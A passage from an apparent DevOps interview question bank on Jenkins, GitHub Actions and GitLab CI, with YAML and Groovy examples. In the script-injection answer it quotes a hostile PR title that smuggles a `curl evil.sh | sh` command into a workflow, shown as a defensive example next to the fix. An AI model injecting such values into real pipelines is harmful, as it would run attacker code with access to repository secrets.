<summary><b>Answer</b></summary>

`retry(n)` re-runs the enclosed steps up to n times on failure (good for flaky network steps, not for hiding flaky tests). `timeout` aborts the enclosed block when time runs out. `catchError` lets a failure mark the build as FAILURE or UNSTABLE while the pipeline keeps going, useful for optional steps.

```groovy
retry(3) { sh 'curl -fsS https://registry.example.com/healthz' }
catchError(buildResult: 'UNSTABLE', stageResult: 'FAILURE') {
  sh './optional-scan.sh'
}
```

</details>

### Q55. What are Jenkins build statuses SUCCESS, UNSTABLE, FAILURE, ABORTED and NOT_BUILT? 🟢

<details>
<summary><b>Answer</b></summary>

- **SUCCESS**: all steps passed.
- **UNSTABLE**: build ran but tests failed or a quality threshold was missed (yellow).
- **FAILURE**: a step errored (red).
- **ABORTED**: stopped by a user, a timeout, or a newer build.
- **NOT_BUILT**: skipped, for example because an upstream stage failed.

`junit` marks the build UNSTABLE when tests fail, so if you want a hard failure you must check `currentBuild.result` or use `catchError`/`error`.

</details>

### Q56. How does Jenkins authenticate and authorise users? 🟡

<details>
<summary><b>Answer</b></summary>

Authentication uses a **security realm**: Jenkins' own user database, LDAP/Active Directory, or SSO via SAML/OIDC plugins. Authorisation uses an **authorization strategy**: "Logged-in users can do anything" (avoid), Matrix-based security, Project-based Matrix, or Role-Based Strategy plugin. In production we use SSO plus role-based access, with admin limited to a small group, and folder-level permissions per team.

</details>

### Q57. What is the difference between `environment` blocks and `withEnv`? 🟡

<details>
<summary><b>Answer</b></summary>

The declarative `environment { }` directive sets variables for the whole pipeline or a single stage, evaluated when the scope starts, and supports `credentials()`. `withEnv([...]) { }` is a step that sets variables only for the enclosed block and is evaluated dynamically, which is handy in scripted code or loops. Built-in variables include `BUILD_NUMBER`, `JOB_NAME`, `WORKSPACE`, `GIT_COMMIT`, `BRANCH_NAME` and `CHANGE_ID`.

</details>

### Q58. How do Jenkins workspaces work and why does `cleanWs` matter? 🟢

<details>
<summary><b>Answer</b></summary>

Each job gets a directory on the agent (`WORKSPACE`, typically `/home/jenkins/workspace/<job>`) where the repo is checked out and files are built. Workspaces persist between runs on static agents, so stale files can make builds pass or fail inconsistently. `cleanWs()` (Workspace Cleanup plugin) removes it, usually in `post { cleanup { } }`, to keep builds clean and agent disks free.

</details>

### Q59. What is the Jenkins Pipeline `script` block and when should you avoid it? 🟢

<details>
<summary><b>Answer</b></summary>

`script { }` lets you run arbitrary scripted Groovy inside a declarative `steps` block, for loops, conditionals or variable manipulation that the declarative syntax cannot express. Avoid large script blocks: they bypass declarative validation, are hard to test, and signal the logic should live in a shared library step or an external shell script.

</details>

### Q60. How do you test a Jenkinsfile change without breaking the main pipeline? 🟡

<details>
<summary><b>Answer</b></summary>

Options in increasing rigour: use the **Replay** feature on a run to edit and re-run the Jenkinsfile without committing; run the declarative linter (`curl -X POST -F "jenkinsfile=<Jenkinsfile" $JENKINS_URL/pipeline-model-converter/validate`); work on a branch, since multibranch builds use that branch's Jenkinsfile; and unit test shared libraries with JenkinsPipelineUnit. Use a staging Jenkins for plugin or core upgrades.

</details>

### Q61. How do you secure the connection between a webhook sender and Jenkins? 🔴

<details>
<summary><b>Answer</b></summary>

Put Jenkins behind HTTPS and validate who is calling. For GitHub, set a webhook secret and use a plugin that verifies `X-Hub-Signature-256` (the Generic Webhook Trigger plugin supports a token and header-based filters). Restrict the ingress to the SCM provider's IP ranges where published, and avoid exposing the full Jenkins UI publicly: expose only the `/github-webhook/` or `/generic-webhook-trigger/invoke` paths via a reverse proxy. Keep CSRF protection enabled, and use API tokens instead of passwords for remote calls.

</details>

### Q62. What is the Blue Ocean UI and is it still recommended? 🟢

<details>
<summary><b>Answer</b></summary>

Blue Ocean was a redesigned Jenkins UI focused on pipeline visualisation. It is in maintenance mode with no new features, and the project points users to the standard UI with the **Pipeline Graph View** plugin, which provides a modern stage visualisation. For new installations, skip Blue Ocean.

</details>

### Q63. How do Jenkins agents get tools like Maven, JDK or Node installed? 🟡

<details>
<summary><b>Answer</b></summary>

Three ways: pre-bake tools into the agent image or VM (best, reproducible); use the `tools { maven 'M3'; jdk 'jdk21' }` directive with Global Tool Configuration auto-installers (slower, installs on demand); or run steps inside tool containers via `agent { docker { image ... } }` or Kubernetes pod containers. We favour containers so each repo declares its own toolchain version in the Jenkinsfile.

</details>

### Q64. How does `lock`, `milestone` and `disableConcurrentBuilds` help with concurrency? 🔴

<details>
<summary><b>Answer</b></summary>

`lock('staging-env')` (Lockable Resources plugin) serialises access to a shared resource, so two pipelines do not deploy to staging simultaneously. `milestone()` makes older builds abort when a newer build passes the same milestone, so you never deploy an older commit over a newer one. `disableConcurrentBuilds(abortPrevious: true)` is the simple version for a whole job.

```groovy
stage('Deploy staging') {
  steps {
    milestone(10)
    lock(resource: 'staging', inversePrecedence: true) {
      sh './deploy.sh staging'
    }
  }
}
```

</details>

### Q65. What is the difference between a Jenkins LTS release and a weekly release? 🟢

<details>
<summary><b>Answer</b></summary>

Weekly releases ship every week with new features and fixes. **LTS** (Long-Term Support) releases are chosen roughly every 12 weeks from the weekly line and receive backported fixes only, with a stable baseline. Production controllers should run LTS and upgrade on a regular cadence, because security fixes arrive in LTS point releases.

</details>

## GitHub Actions

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q66. What are workflows, jobs, steps and actions in GitHub Actions? 🟢

<details>
<summary><b>Answer</b></summary>

A **workflow** is a YAML file in `.github/workflows/` triggered by events. It contains **jobs**, which run on separate runners (in parallel by default). A job contains sequential **steps**, each either a shell command (`run:`) or an **action** (`uses:`), a reusable unit such as `actions/checkout@v4`. Steps in one job share the filesystem; jobs do not, so you pass data via outputs and artifacts.

```yaml
name: ci
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

</details>

### Q67. What events can trigger a workflow? 🟢

<details>
<summary><b>Answer</b></summary>

Common ones: `push`, `pull_request`, `workflow_dispatch` (manual, with inputs), `schedule` (cron, UTC), `release`, `workflow_call` (reusable workflow), `workflow_run` (after another workflow), `repository_dispatch` (API webhook), `merge_group`, and `pull_request_target`. You can filter by branches, tags and paths.

```yaml
on:
  push:
    branches: [main]
    tags: ['v*']
  schedule:
    - cron: '0 3 * * 1'
  workflow_dispatch:
    inputs:
      env: { type: choice, options: [staging, prod], default: staging }
```

</details>

### Q68. What is the difference between `pull_request` and `pull_request_target`? 🔴

<details>
<summary><b>Answer</b></summary>

`pull_request` runs the workflow from the PR's merge commit with a read-only token and **no secrets** for forks, so untrusted code is contained. `pull_request_target` runs the workflow definition from the **base branch** with a write token and access to secrets, designed for labelling or commenting on fork PRs.

The danger: if a `pull_request_target` workflow checks out and runs the PR's code (`ref: ${{ github.event.pull_request.head.sha }}`), an attacker's code runs with secrets and write access (a "pwn request"). Never build or execute untrusted PR code in that context.

</details>

### Q69. What is a runner, and how do GitHub-hosted and self-hosted runners differ? 🟢

<details>
<summary><b>Answer</b></summary>

A runner is the machine that executes a job. **GitHub-hosted** runners (`ubuntu-latest`, `ubuntu-24.04`, `windows-latest`, `macos-latest`, plus larger and ARM sizes) are fresh VMs per job, maintained by GitHub, billed by minute for private repos. **Self-hosted** runners are your machines (VMs, bare metal, Kubernetes pods) with custom hardware and network access to private systems, but you maintain, patch and secure them.

```yaml
runs-on: [self-hosted, linux, x64, gpu]
```

</details>

### Q70. How do you pass data between steps and between jobs? 🟡

<details>
<summary><b>Answer</b></summary>

Within a job, write to `$GITHUB_OUTPUT` and read it via the step id; set env for later steps with `$GITHUB_ENV`. Between jobs, declare `outputs:` on the job and read them through `needs`. Files travel via artifacts.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.v.outputs.version }}
    steps:
      - id: v
        run: echo "version=1.4.${{ github.run_number }}" >> "$GITHUB_OUTPUT"
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.version }}"
```

The old `::set-output` workflow command is deprecated in favour of `$GITHUB_OUTPUT`.

</details>

### Q71. How does a build matrix work? 🟡

<details>
<summary><b>Answer</b></summary>

`strategy.matrix` expands one job definition into multiple jobs across combinations of variables, such as OS and language version. `include` adds or extends combinations, `exclude` removes some, `fail-fast: false` keeps other jobs running when one fails, and `max-parallel` limits concurrency.

```yaml
strategy:
  fail-fast: false
  matrix:
    os: [ubuntu-latest, windows-latest]
    node: [20, 22]
    exclude:
      - { os: windows-latest, node: 20 }
runs-on: ${{ matrix.os }}
steps:
  - uses: actions/setup-node@v4
    with: { node-version: '${{ matrix.node }}' }
```

A matrix can generate at most 256 jobs per workflow run.

</details>

### Q72. What are reusable workflows and how do you call one? 🟡

<details>
<summary><b>Answer</b></summary>

A reusable workflow is a workflow with `on: workflow_call`, defining typed `inputs`, `secrets` and `outputs`. Callers use it at the **job level** with `uses:`, referencing a path in the same repo or `org/repo/.github/workflows/file.yml@ref`.

```yaml
# .github/workflows/build.yml  (callee)
on:
  workflow_call:
    inputs:
      node-version: { type: string, default: '22' }
    secrets:
      NPM_TOKEN: { required: false }
```

```yaml
# caller
jobs:
  build:
    uses: my-org/platform-workflows/.github/workflows/build.yml@v3
    with: { node-version: '20' }
    secrets: inherit
```

Pin callers to a tag or SHA, not `main`.

</details>

### Q73. What is the difference between a reusable workflow and a composite action? 🔴

<details>
<summary><b>Answer</b></summary>

A **reusable workflow** is a whole workflow that contains its own jobs and runners, called at job level (`jobs.x.uses`). It can use secrets, environments and multiple jobs, but nesting is limited (a few levels deep, with a cap on total calls per workflow) and it shows as separate jobs in the UI.

A **composite action** (`action.yml` with `runs.using: composite`) bundles multiple steps into one step that runs inside the caller's job, on the caller's runner and filesystem. It cannot define jobs or use `secrets` directly (pass them as inputs), and every `run` step needs an explicit `shell:`.

Use composite actions for step-level reuse (setup + cache + install) and reusable workflows for standardising entire pipelines.

</details>

### Q74. How do you write a composite action? 🟡

<details>
<summary><b>Answer</b></summary>

Create `action.yml` in a directory (for example `.github/actions/setup-app/`) and use it with a local path.

```yaml
# .github/actions/setup-app/action.yml
name: Setup app
inputs:
  node-version: { default: '22' }
runs:
  using: composite
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: npm
    - run: npm ci
      shell: bash
```

```yaml
- uses: actions/checkout@v4
- uses: ./.github/actions/setup-app
```

Checkout must happen first for local actions to exist.

</details>

### Q75. What are the three types of custom actions? 🟡

<details>
<summary><b>Answer</b></summary>

- **JavaScript actions** (`runs.using: node20`): run directly on the runner, fast, work on all OSes, use the `@actions/core` toolkit.
- **Docker container actions**: run in a container built from a Dockerfile or image; Linux runners only, slower start, full control of the environment.
- **Composite actions**: sequences of steps and other actions.

</details>

### Q76. How do GitHub Environments and required reviewers work? 🟡

<details>
<summary><b>Answer</b></summary>

An environment (such as `production`) is a named deployment target in repo settings with protection rules: required reviewers, wait timers, deployment branch/tag restrictions, and environment-scoped secrets and variables. A job that sets `environment: production` pauses until reviewers approve; its environment secrets become available only after approval.

```yaml
deploy:
  needs: build
  runs-on: ubuntu-latest
  environment:
    name: production
    url: https://app.example.com
  steps:
    - run: ./deploy.sh
```

Environments with reviewers on private repos require a paid plan. Restrict the environment to the `main` branch so a feature branch cannot deploy to it.

</details>

### Q77. How do secrets and variables differ in GitHub Actions, and where can they be defined? 🟢

<details>
<summary><b>Answer</b></summary>

**Secrets** are encrypted values (`${{ secrets.NAME }}`) masked in logs; **variables** (`${{ vars.NAME }}`) are plain-text configuration. Both can be set at organisation, repository, or environment level, with the most specific scope winning. Secrets are not passed to workflows triggered by forked PRs, and reusable workflows only get them if passed explicitly or via `secrets: inherit`.

</details>

### Q78. What is the `GITHUB_TOKEN` and how should you scope it? 🟡

<details>
<summary><b>Answer</b></summary>

`GITHUB_TOKEN` is an automatically created, short-lived token for each job, scoped to the repository. Its default permissions depend on repo/org settings, so set the default to read-only and grant per workflow or job with `permissions:`. Anything not listed becomes `none` once you declare `permissions`.

```yaml
permissions:
  contents: read
jobs:
  release:
    permissions:
      contents: write
      packages: write
      id-token: write
```

</details>

### Q79. Explain OIDC federation from GitHub Actions to a cloud provider. 🔴

<details>
<summary><b>Answer</b></summary>

Instead of storing long-lived cloud keys as secrets, the job requests a short-lived **OIDC JWT** from GitHub (needs `permissions: id-token: write`). The token's claims include `sub` (for example `repo:org/app:ref:refs/heads/main` or `repo:org/app:environment:production`), `repository`, `ref`, `workflow`. The cloud (AWS IAM, Azure, GCP Workload Identity Federation) is configured to trust GitHub's issuer `https://token.actions.githubusercontent.com` and exchanges the JWT for temporary credentials, restricted by a condition on `sub`.

```yaml
permissions: { id-token: write, contents: read }
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
      aws-region: ap-south-1
```

The IAM trust policy must pin `token.actions.githubusercontent.com:sub` to the exact repo and branch or environment, otherwise any repository could assume the role.

</details>

### Q80. How does caching work with `actions/cache`? 🟡

<details>
<summary><b>Answer</b></summary>

`actions/cache` saves a directory under a **key** and restores it in later runs. If no exact key matches, it tries `restore-keys` prefixes (partial hit). Caches are scoped by branch: a PR can read the base branch's cache but not siblings'. The repository has a total cache limit (10 GB by default) and entries unused for 7 days are evicted.

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.m2/repository
    key: maven-${{ runner.os }}-${{ hashFiles('**/pom.xml') }}
    restore-keys: |
      maven-${{ runner.os }}-
```

Many `setup-*` actions (`setup-node` with `cache: npm`, `setup-java` with `cache: maven`) do this for you.

</details>

### Q81. How do artifacts work in GitHub Actions? 🟢

<details>
<summary><b>Answer</b></summary>

`actions/upload-artifact` stores files from a job under the workflow run; `actions/download-artifact` retrieves them in a later job or lets users download them from the UI. Default retention is 90 days (configurable with `retention-days`). With v4, artifact names must be unique per run.

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: app-dist
    path: dist/
    retention-days: 7
```

</details>

### Q82. What is the difference between cache and artifacts in GitHub Actions? 🟢

<details>
<summary><b>Answer</b></summary>

Cache is for speeding up repeated work across runs (dependencies, build outputs) and may be missing. Artifacts are the outputs of a specific run that you want to keep or pass to later jobs, and are guaranteed within that run. Use cache for `node_modules`-type data, artifacts for a built binary, test report or coverage output.

</details>

### Q83. How do `if` conditions and status functions work? 🟡

<details>
<summary><b>Answer</b></summary>

`if:` takes an expression (no `${{ }}` needed). By default a step runs only if previous steps succeeded. Status functions change that: `always()`, `failure()`, `success()`, `cancelled()`.

```yaml
- name: Upload logs on failure
  if: failure()
  uses: actions/upload-artifact@v4
  with: { name: logs, path: logs/ }
- name: Deploy only from main
  if: github.ref == 'refs/heads/main' && github.event_name == 'push'
  run: ./deploy.sh
```

Prefer `always()` with care: it also runs after cancellation. `!cancelled()` is often what you want for cleanup and reporting.

</details>

### Q84. What are contexts and expressions in GitHub Actions? 🟡

<details>
<summary><b>Answer</b></summary>

Expressions `${{ ... }}` read **contexts**: `github` (event, ref, sha, actor), `env`, `vars`, `secrets`, `job`, `steps`, `runner`, `needs`, `matrix`, `inputs`. Functions include `contains`, `startsWith`, `format`, `join`, `toJSON`, `fromJSON`, `hashFiles`. `fromJSON` lets one job emit a JSON matrix for another to consume (dynamic matrices).

```yaml
strategy:
  matrix: ${{ fromJSON(needs.plan.outputs.matrix) }}
```

</details>

### Q85. How does `concurrency` work and when do you use `cancel-in-progress`? 🟡

<details>
<summary><b>Answer</b></summary>

`concurrency.group` ensures only one run (or job) with that group key runs at a time; others queue (only one pending is kept) or cancel the running one if `cancel-in-progress: true`. For PR CI we cancel superseded runs to save minutes. For deployments we usually do **not** cancel in progress, to avoid a half-finished deploy, and just serialise.

```yaml
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

</details>

### Q86. How do you run a job in a container or with service containers? 🟡

<details>
<summary><b>Answer</b></summary>

`container:` runs all steps of a job inside an image; `services:` starts sidecar containers (databases, Redis) reachable by their service name when the job is in a container, or via `localhost` and the mapped port otherwise. Use `options` for health checks so tests wait for readiness.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: pw }
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s --health-retries 10
    steps:
      - uses: actions/checkout@v4
      - run: npm test
        env: { DATABASE_URL: postgres://postgres:pw@localhost:5432/postgres }
```

</details>

### Q87. What is `workflow_dispatch` and how are inputs used? 🟢

<details>
<summary><b>Answer</b></summary>

`workflow_dispatch` adds a "Run workflow" button (and API/CLI trigger) so a workflow can be started manually, with typed inputs (`string`, `boolean`, `choice`, `environment`). Inputs are read from `inputs.<name>`. From the CLI: `gh workflow run deploy.yml -f env=staging -f version=1.4.2`. The workflow file must exist on the default branch for the button to appear.

</details>

### Q88. How should you pin third-party actions, and why? 🔴

<details>
<summary><b>Answer</b></summary>

Tags like `@v4` are mutable: a maintainer (or an attacker who compromises the repo) can repoint the tag to malicious code, as happened in the 2025 `tj-actions/changed-files` incident that leaked secrets from workflow logs. Pinning to a **full commit SHA** is the only immutable reference.

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

Add Dependabot for `github-actions` so SHAs get updated by PR, and allow-list permitted actions in org settings (GitHub also offers an org policy to require SHA pinning).

</details>

### Q89. What is script injection in GitHub Actions and how do you prevent it? 🔴

<details>
<summary><b>Answer</b></summary>

If untrusted data (PR title, branch name, issue body, commit message) is interpolated with `${{ }}` into a `run:` script, it becomes part of the shell command. A PR titled `"; curl evil.sh | sh #` would execute.

Fix: pass the value through an environment variable and reference it as a shell variable, which is treated as data.

```yaml
# vulnerable
- run: echo "${{ github.event.pull_request.title }}"
# safe
- run: echo "$PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

Scan workflows with `zizmor` or `actionlint` in CI.

</details>

### Q90. How do `needs` and job dependencies work, and what happens when a needed job is skipped? 🟡

<details>
<summary><b>Answer</b></summary>

`needs: [a, b]` makes a job wait for both. If a needed job fails or is skipped, the dependent job is skipped by default. To run a job regardless, use `if: always()` or `if: ${{ !cancelled() }}` and inspect `needs.<job>.result` (`success`, `failure`, `cancelled`, `skipped`).

```yaml
notify:
  needs: [build, deploy]
  if: always()
  runs-on: ubuntu-latest
  steps:
    - run: echo "deploy was ${{ needs.deploy.result }}"
```

</details>

### Q91. What is the difference between `env`, `with`, and `inputs`? 🟢

<details>
<summary><b>Answer</b></summary>

`env:` sets environment variables visible to the shell and actions at workflow, job or step level. `with:` passes parameters to an action (`uses:`). `inputs` is the context an action or reusable workflow uses to read what was passed via `with:` (or `workflow_dispatch` inputs). Action inputs are also available to the action as `INPUT_<NAME>` env variables.

</details>

### Q92. How do you create a release and publish packages from GitHub Actions? 🟡

<details>
<summary><b>Answer</b></summary>

Trigger on a version tag, build, then create a GitHub Release with `gh release create` and publish to GHCR/npm with the built-in token.

```yaml
on:
  push:
    tags: ['v*.*.*']
permissions:
  contents: write
  packages: write
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u "${{ github.actor }}" --password-stdin
      - run: |
          docker build -t ghcr.io/${{ github.repository }}:${{ github.ref_name }} .
          docker push ghcr.io/${{ github.repository }}:${{ github.ref_name }}
      - run: gh release create "${{ github.ref_name }}" --generate-notes
        env: { GH_TOKEN: '${{ github.token }}' }
```

</details>

### Q93. What are GitHub Actions usage limits to be aware of? 🟡

<details>
<summary><b>Answer</b></summary>

Key limits: a job can run at most 6 hours on GitHub-hosted runners (self-hosted jobs up to 5 days), a workflow run is limited to 35 days overall including time waiting for approval, a matrix can produce up to 256 jobs per run, and `workflow_dispatch` accepts up to 25 inputs. API rate limits and concurrent job caps depend on the plan. Always set `timeout-minutes` so a hung job does not burn six hours of billed time.

</details>

### Q94. What does `timeout-minutes` and `continue-on-error` do? 🟢

<details>
<summary><b>Answer</b></summary>

`timeout-minutes` cancels a job (or step) that runs too long; the default for jobs is 360 minutes, so set a realistic value. `continue-on-error: true` lets the workflow carry on even if that job or step fails, used for experimental matrix entries or non-blocking checks.

```yaml
jobs:
  test:
    timeout-minutes: 15
    continue-on-error: ${{ matrix.experimental }}
```

</details>

### Q95. What is a workflow_run trigger and when would you use it? 🔴

<details>
<summary><b>Answer</b></summary>

`workflow_run` starts a workflow when another named workflow completes (`types: [completed]`). It runs in the context of the default branch with access to secrets, which makes it the safe pattern for PR workflows from forks: the untrusted `pull_request` workflow builds and uploads an artifact with no secrets, and a privileged `workflow_run` workflow downloads that artifact and posts the comment or deploys.

Treat the downloaded artifact as untrusted input (never execute it or interpolate it into shell).

```yaml
on:
  workflow_run:
    workflows: ['CI']
    types: [completed]
```

</details>

### Q96. How do you use `GITHUB_STEP_SUMMARY`, annotations and workflow commands? 🟡

<details>
<summary><b>Answer</b></summary>

Appending Markdown to `$GITHUB_STEP_SUMMARY` renders a summary on the run page. Workflow commands written to stdout create annotations and control logging: `::error file=app.js,line=10::message`, `::warning::`, `::group::name` and `::endgroup::`, and `::add-mask::value` to mask a value in logs.

```bash
echo "### Test results" >> "$GITHUB_STEP_SUMMARY"
echo "Passed: 482  Failed: 0" >> "$GITHUB_STEP_SUMMARY"
echo "::warning file=src/db.js,line=42::Deprecated API"
```

</details>

### Q97. What is the difference between `runs-on: ubuntu-latest` and a pinned version like `ubuntu-24.04`? 🟢

<details>
<summary><b>Answer</b></summary>

`ubuntu-latest` is an alias GitHub moves to the newest stable Ubuntu image over time, which can suddenly change toolchains and break builds. A pinned label (`ubuntu-24.04`) stays on that image until it is deprecated, giving predictable upgrades that you control. For stable CI, pin and bump deliberately.

</details>

### Q98. How does `actions/checkout` behave regarding history and submodules? 🟡

<details>
<summary><b>Answer</b></summary>

By default it does a shallow clone (`fetch-depth: 1`) of the triggering commit, which is fast but breaks things that need history: `git describe`, changelog generation, SonarQube blame, or merge-base diffs. Set `fetch-depth: 0` for full history, `submodules: recursive` for submodules, and `persist-credentials: false` to avoid leaving the token in `.git/config` when later steps run untrusted code.

```yaml
- uses: actions/checkout@v4
  with:
    fetch-depth: 0
    persist-credentials: false
```

</details>

### Q99. How do you build and push Docker images efficiently in GitHub Actions? 🟡

<details>
<summary><b>Answer</b></summary>

Use `docker/setup-buildx-action`, log in with `docker/login-action`, and `docker/build-push-action` with the GitHub Actions cache backend for layer caching. `docker/metadata-action` generates tags and labels.

```yaml
- uses: docker/setup-buildx-action@v3
- uses: docker/login-action@v3
  with: { registry: ghcr.io, username: '${{ github.actor }}', password: '${{ secrets.GITHUB_TOKEN }}' }
- uses: docker/build-push-action@v6
  with:
    push: true
    tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

</details>

### Q100. What is a "required workflow" or ruleset-based workflow enforcement in GitHub? 🔴

<details>
<summary><b>Answer</b></summary>

Organisations can enforce that a specific workflow (typically security scans or compliance checks) must pass on every repository, without each team copying it, using **repository rulesets** with the "Require workflows to pass before merging" rule. The workflow lives in a central repo and runs against the target repo's PRs; teams cannot delete or edit it. It complements required status checks and CODEOWNERS for the `.github/workflows` directory.

</details>

### Q101. How do self-hosted runners register and receive jobs? 🟡

<details>
<summary><b>Answer</b></summary>

You download the runner application, run `./config.sh --url https://github.com/org/repo --token <registration-token> --labels gpu,linux --ephemeral`, then `./run.sh` or install it as a service. The runner opens an outbound HTTPS long-poll to GitHub and picks up jobs whose `runs-on` labels match; no inbound ports are needed. `--ephemeral` makes it take exactly one job then unregister, the recommended mode for security.

</details>

### Q102. What is Actions Runner Controller (ARC)? 🔴

<details>
<summary><b>Answer</b></summary>

ARC is the GitHub-supported Kubernetes operator that runs self-hosted runners as ephemeral pods that autoscale with the job queue. The current design is **runner scale sets**: you install a controller (`gha-runner-scale-set-controller` Helm chart) and one scale set per runner pool (`gha-runner-scale-set` chart), and workflows target the scale set's name in `runs-on`. A listener watches the queue and creates a pod per job, deleting it afterwards, so every job gets a clean environment and you scale to zero when idle.

```yaml
runs-on: arc-runner-set
```

</details>

### Q103. How do you share data from one workflow to another? 🟡

<details>
<summary><b>Answer</b></summary>

Within one run, use `needs` outputs and artifacts. Across workflows: a reusable workflow returns `outputs`; `workflow_run` plus `actions/download-artifact` (with `run-id` and a token) fetches artifacts from a different run; and `repository_dispatch` or `workflow_dispatch` calls can carry a payload or inputs. For long-lived data, publish to a package registry or object store.

</details>

### Q104. What do `defaults.run` and `shell` do? 🟢

<details>
<summary><b>Answer</b></summary>

`defaults.run.shell` and `defaults.run.working-directory` set defaults for all `run` steps in a workflow or job, so you do not repeat them. On Linux the default shell is `bash -e {0}` unless you set `shell: bash`, which uses `bash --noprofile --norc -eo pipefail {0}`, so pipes fail properly. Always set `shell: bash` when you rely on `pipefail`.

```yaml
defaults:
  run:
    shell: bash
    working-directory: ./app
```

</details>

### Q105. How do you debug a failing GitHub Actions workflow? 🟡

<details>
<summary><b>Answer</b></summary>

Re-run with debug logging (the "Enable debug logging" checkbox, or set secret/variable `ACTIONS_STEP_DEBUG=true`), lint locally with `actionlint`, reproduce with `act` for simple workflows, and add diagnostic steps that print `toJSON(github)` (never secrets). For runner-side problems, a tmate-style SSH session action can be used on a non-sensitive repo. `gh run view <id> --log-failed` pulls only failing step logs from the CLI.

</details>

### Q106. What is an immutable action release and why does it matter? 🔴

<details>
<summary><b>Answer</b></summary>

GitHub introduced immutable releases (2025): once a release is published, its tag and assets can no longer be modified or deleted and the release carries an attestation. For action authors this means a `v1.2.3` reference cannot be silently repointed, closing the mutable-tag attack path for actions that opt in. Consumers should still pin SHAs for actions that have not adopted it.

</details>

### Q107. What is the `needs` + `strategy.matrix` pattern for fan-out and fan-in? 🔴

<details>
<summary><b>Answer</b></summary>

A planning job computes a list (changed services, test shards) and outputs it as JSON; a matrix job fans out over `fromJSON(...)`; a final gate job with `needs: [matrix-job]` fans in, so one required check represents all shards. The gate must use `if: always()` and fail explicitly if the matrix result is not success, otherwise a skipped matrix would show as green.

```yaml
gate:
  needs: test
  if: always()
  runs-on: ubuntu-latest
  steps:
    - run: test "${{ needs.test.result }}" = "success"
```

</details>

### Q108. How do you schedule a workflow and what are the caveats? 🟢

<details>
<summary><b>Answer</b></summary>

Use `on.schedule.cron` with standard five-field cron syntax in **UTC**. Caveats: scheduled runs can be delayed under load (especially at the top of the hour), run only on the default branch, and are automatically disabled in public repositories after 60 days without repo activity.

```yaml
on:
  schedule:
    - cron: '17 2 * * *'   # daily at 02:17 UTC
```

</details>

### Q109. What is `actions/attest-build-provenance` and what does it produce? 🔴

<details>
<summary><b>Answer</b></summary>

It generates a signed **SLSA build provenance attestation** for a built artifact or image, signed through Sigstore using the workflow's OIDC identity, and stores it with GitHub (and optionally in the registry). The attestation states which repo, commit, workflow and runner built the subject digest. Consumers verify with `gh attestation verify ./app.tar.gz --repo org/app`. It needs `id-token: write` and `attestations: write`.

```yaml
permissions: { id-token: write, attestations: write, contents: read }
steps:
  - uses: actions/attest-build-provenance@v2
    with: { subject-path: dist/app.tar.gz }
```

</details>

### Q110. What is the difference between `uses: ./path`, `uses: owner/repo@ref`, and `docker://` references? 🟢

<details>
<summary><b>Answer</b></summary>

`uses: ./.github/actions/foo` runs an action from the checked-out repo (checkout must run first). `uses: owner/repo@ref` pulls an action from another repository at a tag, branch or SHA (use `owner/repo/subdir@ref` for sub-path actions). `uses: docker://alpine:3.20` runs a step directly in a public Docker image.

</details>

## GitLab CI

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q111. How does GitLab CI/CD work at a high level? 🟢

<details>
<summary><b>Answer</b></summary>

You add `.gitlab-ci.yml` to the repo root. GitLab creates a **pipeline** per trigger (push, merge request, schedule, API), made of **stages** containing **jobs**. Jobs are picked up by **runners** registered with the instance, project or group. Jobs in the same stage run in parallel; stages run in order.

```yaml
stages: [build, test, deploy]
build:
  stage: build
  script: [make build]
test:
  stage: test
  script: [make test]
```

</details>

### Q112. What is a GitLab Runner and what executors exist? 🟡

<details>
<summary><b>Answer</b></summary>

GitLab Runner is the agent (written in Go) that polls GitLab for jobs and runs them. The **executor** decides how: `shell` (directly on the host), `docker` (a container per job from `image:`), `kubernetes` (a pod per job), `docker-autoscaler`/`instance` (cloud autoscaling), and `ssh`/`virtualbox`/`parallels`. Docker and Kubernetes are the common choices because they give clean per-job environments.

```bash
gitlab-runner register --url https://gitlab.example.com \
  --token glrt-xxxx --executor docker --docker-image alpine:3.20
```

</details>

### Q113. What are the types of runners (shared, group, project) and tags? 🟡

<details>
<summary><b>Answer</b></summary>

**Instance (shared)** runners serve every project, **group** runners serve all projects in a group, and **project** runners belong to one project. Jobs choose runners with `tags:`; a runner takes a job only when it has all of the job's tags (or if it is set to run untagged jobs). Use dedicated tagged runners for privileged work, such as production deploys or Docker-in-Docker, so general builds cannot reach them.

</details>

### Q114. How do `rules:` work and how do they replace `only/except`? 🟡

<details>
<summary><b>Answer</b></summary>

`rules` is a list evaluated top to bottom; the first match decides whether the job is added (`when: on_success`, `manual`, `never`, `delayed`). Conditions: `if` (CI variable expressions), `changes` (paths), `exists`. `only/except` are legacy and cannot be combined with `rules`.

```yaml
deploy:
  script: ./deploy.sh
  rules:
